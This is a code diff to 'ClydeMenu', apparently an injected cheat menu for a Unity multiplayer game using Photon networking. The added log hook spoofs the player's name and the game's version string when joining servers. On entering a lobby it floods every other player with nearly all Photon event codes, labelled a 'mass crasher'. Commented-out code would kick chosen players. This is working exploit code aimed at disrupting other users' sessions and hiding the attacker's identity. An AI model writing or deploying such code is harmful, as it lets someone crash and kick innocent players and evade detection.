@@ -10,6 +10,9 @@ using Object = UnityEngine.Object;
 using ClydeMenu.Engine;
 using System.Diagnostics;
 using Debug = UnityEngine.Debug;
+using Photon.Pun;
+using ExitGames.Client.Photon;
+using Photon.Realtime;
 
 public class Entry
 {
@@ -30,7 +33,7 @@ public class Entry
 
         Console.WriteLine("ClydeMenu injected successfully");
 
-        Application.logMessageReceived += (logString, stackTrace, type) => Console.WriteLine($"(LOG) - [{type}] {logString}");
+        Application.logMessageReceived += onLog;
 
         try
         {
@@ -41,6 +44,54 @@ public class Entry
         {
             Console.WriteLine($"Error loading comps: {e}");
             return;
+        }
+    }
+
+    private static void onLog(string logString, string stackTrace, LogType type)
+    {
+        Console.WriteLine($"(LOG) [{type}] {logString}");
+
+        // namespoofer
+        if (logString.Contains("Joining specific open server:"))
+        {
+            NameSpoofer.randomName(); // :)
+        }
+
+        // versionsspoofer
+        if (logString.Contains("Photon - Set Version"))
+        {
+            PhotonNetwork.PhotonServerSettings.AppSettings.AppVersion = "v0.1.2";
+            NameSpoofer.randomName(); // :)
+        }
+
+        // massccrasher
+        if (logString.Contains("Steam: Lobby entered with ID"))
+        {
+            var options = new RaiseEventOptions();
+            options.Receivers = ReceiverGroup.All;
+            for (byte i = 0; i < 0xFF; ++i)
+            {
+                if (i==199)
+                    continue;
+                PhotonNetwork.RaiseEvent(i, null, options, SendOptions.SendReliable);
+            }
+
+            //foreach (var plyr in SemiFunc.PlayerGetList())
+            //{
+            //    if (plyr.photonView.OwnerActorNr == PhotonNetwork.LocalPlayer.ActorNumber
+            //        || plyr.photonView.OwnerActorNr == PhotonNetwork.MasterClient.ActorNumber)
+            //        continue;
+            //    var plyrActorId = plyr.photonView.OwnerActorNr;
+            //
+            //    var options = new RaiseEventOptions();
+            //    options.TargetActors = new[] { plyrActorId };
+            //    PhotonNetwork.RaiseEvent(199, null, options, SendOptions.SendReliable);
+            //    Console.WriteLine($"Kicked player {plyr.name} from the server.");
+            //}
+
+            //var options = new RaiseEventOptions();
+            //options.TargetActors = new[] { PhotonNetwork.LocalPlayer.ActorNumber };
+            //PhotonNetwork.RaiseEvent(199, null, options, SendOptions.SendReliable);
         }
     }
 
